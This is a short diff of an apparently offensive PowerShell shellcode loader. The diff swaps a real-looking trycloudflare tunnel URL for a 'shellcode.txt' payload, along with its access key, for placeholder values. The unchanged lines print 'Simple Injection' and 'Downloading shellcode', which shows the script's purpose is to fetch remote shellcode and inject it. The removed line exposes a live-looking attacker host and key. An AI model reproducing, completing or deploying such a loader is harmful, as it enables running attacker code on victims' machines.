@@ -1,4 +1,4 @@
-$u='https://census-labels-warming-stevens.trycloudflare.com/payloads/shellcode.txt?key=a93c3a2ac43e3316'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 Write-Host "[*] Simple Injection"
 Write-Host "[*] Downloading shellcode..."
